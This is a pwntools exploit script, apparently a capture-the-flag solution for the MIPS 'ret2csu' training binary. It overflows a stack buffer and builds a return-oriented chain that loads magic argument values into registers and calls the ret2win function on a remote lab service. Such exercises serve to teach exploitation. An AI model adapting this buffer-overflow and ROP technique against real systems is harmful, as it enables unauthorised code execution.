from pwn import *
BINARY = "./ret2csu_mipsel"
ELF = ELF(BINARY)

context.os = "linux"
context.arch = "mips"
context.binary = BINARY

load_regs = 0x004009C0

ret2win_got = 0x00411058
call_ret2win = 0x004009A0

p = remote("10.0.0.2", 9999)

rop = b"A" * 0x24
rop += p32(load_regs)

rop += b"B" * 0x1C
rop += p32(ret2win_got) # ret2win,s0
rop += b"B" * 4 # s1无用
rop += b"B" * 4 # s2无用
rop += p32(0xDEADBEEF) # s3->a0
rop += p32(0xCAFEBABE) # s4->a1
rop += p32(0xD00DF00D) # s5->a2
rop += p32(call_ret2win)

p.recvuntil(b"> ")
p.sendline(rop)

print(p.recvline_contains(b"ROPE"))